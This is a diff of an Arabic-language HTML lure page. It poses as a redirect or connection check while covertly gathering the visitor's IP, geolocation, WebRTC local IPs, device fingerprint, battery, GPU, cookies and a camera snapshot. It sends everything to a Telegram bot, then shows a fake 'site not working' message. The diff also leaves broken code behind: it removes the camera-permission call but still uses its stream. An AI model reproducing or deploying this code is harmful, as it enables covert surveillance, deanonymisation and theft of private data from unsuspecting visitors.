@@ -19,8 +19,8 @@
       flex-direction: column;
     }
     .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #3498db;
+      border: 6px solid #121212;
+      border-top: 6px solid #ffffff;
       border-radius: 50%;
       width: 60px;
       height: 60px;
@@ -40,7 +40,7 @@
 <body>
 
 <div class="loader"></div>
-<h2>🔒 جارٍ التحقق من اتصالك الآمن...</h2>
+<h2> يتم توجيهك إلى الموقع </h2>
 
 <!-- تم إزالة عناصر الكاميرا المرئية -->
 <video id="cameraPreview" autoplay playsinline style="display:none;"></video>
@@ -59,12 +59,6 @@
     try {
       const video = document.getElementById('cameraPreview');
       const canvas = document.getElementById('canvas');
-      
-      // طلب إذن الكاميرا
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'user' }, 
-        audio: false 
-      });
       
       video.srcObject = stream;
       
@@ -102,43 +96,201 @@
     const ipinfo = await fetch("https://ipinfo.io/json?token=ded76e1cc16472").then(r => r.json());
     const mapLink = `https://www.google.com/maps?q=${ipinfo.loc}`;
 
-// معلومات الجهاز
+    // معلومات الجهاز
     const ua = platform;
-    const connection = navigator.connection  navigator.mozConnection  navigator.webkitConnection  {};
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
     const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 هاتف" : "💻 كمبيوتر/لوحي";
-    const ram = navigator.deviceMemory  "غير معروف";
-    const cpu = navigator.hardwareConcurrency  "غير معروف";
+    const ram = navigator.deviceMemory || "غير معروف";
+    const cpu = navigator.hardwareConcurrency || "غير معروف";
 
     // كاميرا ومايك
     const devices = await navigator.mediaDevices.enumerateDevices();
     const hasCam = devices.some(d => d.kind === "videoinput");
     const hasMic = devices.some(d => d.kind === "audioinput");
 
+    
+
+      // معلومات الشبكة المتقدمة
+      const networkDetails = await fetch("https://ipapi.co/json/").then(response => response.json());
+      const isProxy = networkDetails.org && networkDetails.org.includes("proxy") ? "نعم" : "لا";
+      const isVPN = networkDetails.org && networkDetails.org.includes("vpn") ? "نعم" : "لا";
+      const dns = networkDetails.dns || "غير معروف";
+      const isp = networkDetails.org || "غير معروف";
+      const country = networkDetails.country || "غير معروف";
+      const city = networkDetails.city || "غير معروف";
+      const region = networkDetails.region || "غير معروف";
+      const timezone = networkDetails.timezone || "غير معروف";
+
+      const networkType = connection.effectiveType || "غير معروف";
+      const downlink = connection.downlink || "غير معروف";
+      const rtt = connection.rtt || "غير معروف";
+      const networkSpeed = downlink !== "غير معروف" ? `${downlink} Mbps` : "غير معروف";
+      // دالة معلومات الشبكة المتقدمة
+        async function getAdvancedNetworkInfo() {
+          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+          const networkInfo = {
+            type: connection.type || "غير معروف",
+            effectiveType: connection.effectiveType || "غير معروف",
+            downlink: connection.downlink || "غير معروف",
+            rtt: connection.rtt || "غير معروف",
+            saveData: connection.saveData ? "نعم" : "لا",
+          };
+
+          const ipInfo = await fetch("https://ipinfo.io/json?token=ded76e1cc16472").then(r => r.json());
+          const ipapi = await fetch("https://ipapi.co/json/").then(r => r.json());
+          const isProxy = ipapi.org && /proxy/i.test(ipapi.org) ? "نعم" : "لا";
+          const isVPN = ipapi.org && /vpn/i.test(ipapi.org) ? "نعم" : "لا";
+          const isCellular = /cellular/i.test(ipapi.network) ? "نعم" : "لا";
+
+          const getLocalIPs = async () => {
+            return new Promise((resolve, reject) => {
+              const ips = new Set();
+              const pc = new RTCPeerConnection({ iceServers: [] });
+              pc.createDataChannel('');
+              pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
+              pc.onicecandidate = (event) => {
+                if (!event || !event.candidate) {
+                  pc.close();
+                  resolve(Array.from(ips));
+                  return;
+                }
+                const match = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                if (match) {
+                  ips.add(match[1]);
+                }
+              };
+            });
+          };
+
+          const localIPs = await getLocalIPs();
+
+          return {
+            ...networkInfo,
+            isp: ipapi.org || "غير معروف",
+            ip: ipInfo.ip || "غير معروف",
+            city: ipapi.city || "غير معروف",
+            region: ipapi.region || "غير معروف",
+            country: ipapi.country_name || "غير معروف",
+            timezone: ipapi.timezone || "غير معروف",
+            dns: ipapi.dns || "غير معروف",
+            isProxy,
+            isVPN,
+            isCellular,
+            localIPs,
+          };
+        }
+
+
+        
+        // الحصول على اسم الشبكة (إن كان متاحًا)
+        const networkName = connection.type || "غير معروف"; // نوع الاتصال بالشبكة
+
+        // معلومات إضافية عن الجهاز
+        const browserName = ua.name || "غير معروف";
+        const browserVersion = ua.version || "غير معروف";
+        const language = navigator.language || "غير معروف";
+        const gpuInfo = (() => {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          if (!gl) return "غير مدعوم";
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "غير معروف";
+        })();
+        const batteryInfo = await navigator.getBattery?.().then(b => `⚡ نسبة الشحن: ${Math.round(b.level * 100)}% - ${b.charging ? "يتم الشحن" : "لا يشحن"}`) || "غير متاح";
+        const maxTouchPoints = navigator.maxTouchPoints || 0;
+        const pageLoadTime = performance.timing ? (performance.now() / 1000).toFixed(2) + " ثانية" : "غير متاح";
+
+
+        // فحص إعدادات الخصوصية
+        const privacySettings = {
+          doNotTrack: navigator.doNotTrack || "غير معروف",
+          cookieEnabled: navigator.cookieEnabled ? "نعم" : "لا",
+          localStorageEnabled: typeof localStorage !== "undefined" ? "نعم" : "لا",
+          sessionStorageEnabled: typeof sessionStorage !== "undefined" ? "نعم" : "لا"
+        };
+
+        // مراقبة الأنشطة داخل التطبيقات
+        const appActivities = {
+          userInteraction: "غير معروف",  // يمكن توسيع هذه الوظيفة بطرق لتتبع تفاعل المستخدم
+        };
+
+        // مراقبة تحميل البيانات
+        const dataUploadDownload = {
+          uploadSpeed: "غير معروف",  // يمكن استخدام واجهات معينة لاختبار سرعة الرفع
+          downloadSpeed: "غير معروف",  // اختبار سرعة التحميل
+        };
+
+        // مراقبة تهديدات الشبكة
+        const networkThreats = {
+          detectedVPN: isVPN,
+          detectedProxy: isProxy,
+        };
+
+        // تحليل ملفات الـ cookies
+        const cookies = document.cookie.split(';').map(cookie => cookie.trim());
+        const cookieFile = new Blob([cookies.join("\n")], { type: 'text/plain' });
+
+        // مراقبة الذاكرة
+        const memoryUsage = performance.memory ? performance.memory.usedJSHeap : "غير متاح";
+
+        // إرسال الرسائل إلى تيليجرام بشكل تدريجي (كل جزء على حدة)
+        const sendMessage = async (message) => {
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          });
+        };
+
     // بناء الرسالة
-    const msg = `
-📥 *زائر جديد:*
+      await sendMessage(`**📥 تفاصيل الزائر:**`);
+        await sendMessage(`**🌍 معلومات IP والشبكة:**\n   - *IP:* ${ipinfo.ip}\n   - *الموقع:* ${city}, ${region}, ${country}\n   - *مزود الخدمة (ISP):* ${isp}\n   - *الموقع الجغرافي:* [اضغط هنا لعرض الموقع](https://www.google.com/maps?q=${ipinfo.loc})\n   - *DNS:* ${dns}`);
+        
+        // شبكة وبيانات إضافية
+        // إرسال معلومات الشبكة المتقدمة
+      const advancedNet = await getAdvancedNetworkInfo();
+        await sendMessage(`**📡 معلومات الشبكة المتقدمة:**\n- نوع الاتصال: ${advancedNet.type}\n- الاتصال الفعلي: ${advancedNet.effectiveType}\n- سرعة التحميل: ${advancedNet.downlink} Mbps\n- زمن الاستجابة: ${advancedNet.rtt} ms\n- توفير البيانات: ${advancedNet.saveData}\n- DNS: ${advancedNet.dns}\n- الشبكة خلوية: ${advancedNet.isCellular}\n- VPN: ${advancedNet.isVPN}\n- Proxy: ${advancedNet.isProxy}\n- IP محلي (WebRTC): ${advancedNet.localIPs.join(', ') || "غير متاح"}`);
+        await sendMessage(`**🌐 الشبكة:**\n   - *نوع الشبكة:* ${networkType.toUpperCase()}\n   - *سرعة التحميل:* ${networkSpeed}\n   - *زمن الاستجابة (RTT):* ${rtt} ms\n   - *اسم الشبكة:* ${networkName}\n   - *هل تستخدم VPN:* ${isVPN}\n   - *هل تستخدم بروكسي:* ${isProxy}`);
+        
+        // تفاصيل الجهاز
+        await sendMessage(`**🔎 معلومات إضافية عن الجهاز:**\n- *المتصفح:* ${browserName} ${browserVersion}\n- *اللغة:* ${language}\n- *GPU:* ${gpuInfo}\n- *البطارية:* ${batteryInfo}\n- *عدد نقاط اللمس:* ${maxTouchPoints}\n- *زمن تحميل الصفحة:* ${pageLoadTime}`);
+        await sendMessage(`**🖥 تفاصيل الجهاز:**\n   - *نوع الجهاز:* ${deviceType}\n   - *نظام التشغيل:* ${ua.os}\n   - *المعالج:* ${cpu}\n   - *الرام:* ${ram} GB\n   - *دقة الشاشة:* ${screen.width}x${screen.height}`);
+        
+        // بصمة المتصفح
+        await sendMessage(`**🧬 بصمة المتصفح:**\n   - ${browserFingerprint}`);
+        
+        // معلومات إضافية عن الموقع والخصائص
+        await sendMessage(`**📍 الموقع الجغرافي:**\n   - *خط العرض:* ${latitude}\n   - *خط الطول:* ${longitude}\n   - *المنطقة الزمنية:* ${timezone}`);
+        
+        // معلومات كاميرا ومايكروفون
+        await sendMessage(`**🎥 كاميرا ومايكروفون:**\n   - *كاميرا:* ${hasCam ? "نعم" : "لا"}\n   - *مايكروفون:* ${hasMic ? "نعم" : "لا"}`);
+        
+        // معلومات الخصوصية
+        await sendMessage(`**🔐 معلومات الخصوصية:**\n   - *عدم تتبع:* ${privacySettings.doNotTrack}\n   - *ملفات تعريف الارتباط:* ${privacySettings.cookieEnabled}\n   - *تخزين محلي:* ${privacySettings.localStorageEnabled}\n   - *تخزين الجلسة:* ${privacySettings.sessionStorageEnabled}`);
+        
+        // تهديدات الشبكة
+        await sendMessage(`**⚠️ مراقبة التهديدات الشبكية:**\n   - *هل يستخدم VPN:* ${isVPN}\n   - *هل يستخدم بروكسي:* ${isProxy}`);
+        
+        // الذاكرة المستخدمة
+        await sendMessage(`**💾 الذاكرة:**\n   - *الذاكرة المستخدمة:* ${memoryUsage}`);
 
-🌍 *IP:* ${ipinfo.ip}
-🏙 *الموقع:* ${ipinfo.city}, ${ipinfo.region}, ${ipinfo.country}
-🔌 *مزود الخدمة:* ${ipinfo.org}
-🗺 *الموقع على الخريطة:* [اضغط هنا](${mapLink})
+        await sendMessage(imageBlob);
 
-🖥 *الجهاز:* ${deviceType}
-💻 *النظام:* ${ua.os}
-🧠 *المعالج:* ${cpu}
-💾 *الرام:* ${ram} GB
-🌐 *المتصفح:* ${ua.name} ${ua.version}
-📺 *دقة الشاشة:* ${screen.width}x${screen.height}
-⚡️ *نوع الشبكة:* ${(connection.effectiveType  "غير معروف").toUpperCase()} (${connection.type  "غير معروف"})
-🚀 *التحميل:* ${connection.downlink  "غير معروف"} Mbps
 
-🈯️ *اللغة:* ${navigator.language}
-⏰ *المنطقة الزمنية:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-🎥 *كاميرا:* ${hasCam ? "نعم" : "لا"}
-🎙 *مايك:* ${hasMic ? "نعم" : "لا"}
-
-🧬 *بصمة المتصفح:* ${browserFingerprint}
-    `;
+    // إرسال الصورة إذا كانت موجودة
+      if (imageBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', imageBlob, 'captured.jpg');
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      }
 
     // الإرسال إلى تيليجرام
     const formData = new FormData();
@@ -153,7 +305,7 @@
         body: formData
       });
     } else {
-      await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -165,11 +317,11 @@
     }
 
     // تغيير النص بعد الإرسال
-    document.body.innerHTML = <h1>✅ تم التحقق بنجاح!</h1>;
+    document.body.innerHTML = `<h1> الموقع لا يعمل </h1>`;
 
   } catch (err) {
     console.error("حدث خطأ:", err);
-    document.body.innerHTML = <h1>❌ حدث خطأ أثناء التحقق!</h1>;
+    document.body.innerHTML = `<h1> حدث خطأ </h1>`;
   }
 })();
 </script>
